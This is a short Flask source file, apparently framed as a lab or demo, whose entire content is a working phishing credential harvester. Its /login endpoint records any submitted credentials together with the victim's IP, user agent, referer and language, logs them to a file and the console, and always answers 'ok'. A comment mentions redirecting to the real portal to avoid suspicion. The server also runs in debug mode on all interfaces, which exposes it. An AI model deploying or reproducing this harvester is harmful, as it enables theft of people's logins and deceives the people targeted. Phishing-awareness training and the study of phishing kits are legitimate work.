from flask import Flask, request, jsonify
import logging
import json
from datetime import datetime

app = Flask(__name__)

logging.basicConfig(
    filename='lab_capture.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json() or request.form.to_dict()

    metadata = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent'),
        "referer": request.headers.get('Referer'),
        "accept_language": request.headers.get('Accept-Language'),
        "credentials": data
    }

    # Log to console
    print(json.dumps(metadata, indent=2))

    # Log to file
    logging.info(json.dumps(metadata))

    # Optionally redirect to real portal to avoid suspicion (for demo realism)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)